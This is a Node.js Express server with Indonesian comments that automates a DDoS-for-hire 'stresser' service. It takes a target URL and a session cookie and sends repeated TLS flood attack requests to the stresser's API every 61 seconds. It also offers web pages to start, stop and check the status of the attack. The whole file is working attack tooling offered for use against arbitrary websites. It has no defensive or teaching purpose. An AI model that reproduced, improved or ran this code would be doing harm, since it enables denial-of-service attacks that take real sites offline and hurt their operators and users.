const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// Konfigurasi
const VIOLET_API_URL = "https://violetstresser.me/api/attack";
const DEFAULT_USER = "vh7788";
const LOOP_INTERVAL_MS = 61000; // 61 Detik

// Global State untuk menyimpan sesi attack yang sedang berjalan
let currentSession = null;

// Helper: Headers Request
const getHeaders = (cookie) => ({
    "Host": "violetstresser.me",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "https://violetstresser.me",
    "Referer": "https://violetstresser.me/hub",
    "Cookie": cookie,
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"'
});

// Fungsi Kirim Attack ke Violet
async function sendVioletAttack(target, cookie) {
    try {
        const payload = {
            username: DEFAULT_USER,
            host: target,
            port: "443",
            time: 60,
            method: "TLS",
            concurrents: 1
        };

        const res = await axios.post(VIOLET_API_URL, payload, {
            headers: getHeaders(cookie),
            timeout: 10000
        });

        if (res.status === 200 && res.data.success) {
            return { success: true, endTime: res.data.data?.endTime };
        } else if (res.status === 403) {
            return { success: false, error: "Cookie Expired (403)" };
        } else {
            return { success: false, error: `HTTP ${res.status}` };        }
    } catch (err) {
        return { success: false, error: err.message };
    }
}

// Fungsi Looping Otomatis
function startAutoLoop(target, cookie) {
    // Reset session
    currentSession = {
        target: target,
        isActive: true,
        loops: 0,
        lastResult: null
    };

    console.log(`[SYSTEM] Auto-Loop Started for: ${target}`);

    const loop = async () => {
        if (!currentSession || !currentSession.isActive) {
            console.log("[SYSTEM] Loop Stopped.");
            return;
        }

        currentSession.loops++;
        console.log(`[LOOP #${currentSession.loops}] Sending attack...`);

        const result = await sendVioletAttack(target, cookie);
        currentSession.lastResult = result;

        if (!result.success) {
            console.log(`[ERROR] ${result.error}. Stopping loop.`);
            currentSession.isActive = false;
        } else {
            console.log(`[OK] Success. Next in 61s...`);
            // Jadwalkan loop berikutnya
            setTimeout(loop, LOOP_INTERVAL_MS);
        }
    };

    // Jalankan loop pertama segera
    loop();
}

// --- ENDPOINTS ---

// 1. START ATTACK (Input Target & Cookie Langsung Disini)
// Cara Pakai: POST /start?target=https://site.com&cookie=cf_clearance=xxx
// ATAU via Body JSON: { "target": "...", "cookie": "..." }
app.post('/start', (req, res) => {    // Ambil dari Query Parameter atau Body JSON (biar fleksibel)
    let target = req.query.target || (req.body ? req.body.target : null);
    let cookie = req.query.cookie || (req.body ? req.body.cookie : null);

    if (!target || !cookie) {
        return res.status(400).send("Error: Please provide 'target' and 'cookie'.<br>Example: /start?target=https://google.com&cookie=cf_clearance=...");
    }

    // Format Target
    if (!target.startsWith("http")) {
        target = "https://" + target;
    }

    // Jika sudah ada yang jalan, matikan dulu
    if (currentSession && currentSession.isActive) {
        currentSession.isActive = false;
        console.log("[SYSTEM] Previous session stopped.");
    }

    // Mulai Session Baru
    startAutoLoop(target, cookie);

    res.send(`
        <h1>✅ Attack Started!</h1>
        <p><strong>Target:</strong> ${target}</p>
        <p><strong>Status:</strong> Running (Loop every 61s)</p>
        <p><a href="/status">Check Status</a> | <a href="/stop">Stop Attack</a></p>
    `);
});

// 2. STOP ATTACK
app.get('/stop', (req, res) => {
    if (currentSession && currentSession.isActive) {
        currentSession.isActive = false;
        res.send("<h1>🛑 Attack Stopped.</h1><p><a href='/'>Home</a></p>");
    } else {
        res.send("<h1>⚠️ No active attack found.</h1><p><a href='/'>Home</a></p>");
    }
});

// 3. CHECK STATUS (Tampilan Web Sederhana)
app.get('/status', (req, res) => {
    if (!currentSession) {
        return res.send("<h1>ℹ️ No Session History</h1>");
    }

    const statusColor = currentSession.isActive ? "green" : "red";
    const statusText = currentSession.isActive ? "RUNNING 🟢" : "STOPPED 🔴";

    res.send(`        <h1>📊 Attack Status</h1>
        <p><strong>Status:</strong> <span style="color:${statusColor}; font-weight:bold;">${statusText}</span></p>
        <p><strong>Target:</strong> ${currentSession.target}</p>
        <p><strong>Loops Completed:</strong> ${currentSession.loops}</p>
        <p><strong>Last Result:</strong> ${JSON.stringify(currentSession.lastResult)}</p>
        <hr>
        <p><a href="/stop">Stop Attack</a> | <a href="/">Home</a></p>
    `);
});

// Home Page
app.get('/', (req, res) => {
    res.send(`
        <h1>🚀 Violet Stresser Easy API</h1>
        <p>Use this endpoint to start attack:</p>
        <code>POST /start?target=URL&cookie=COOKIE</code>
        <br><br>
        <p>Or use Body JSON:</p>
        <pre>{ "target": "https://...", "cookie": "cf_clearance=..." }</pre>
        <br>
        <p><a href="/status">Check Status</a></p>
    `);
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
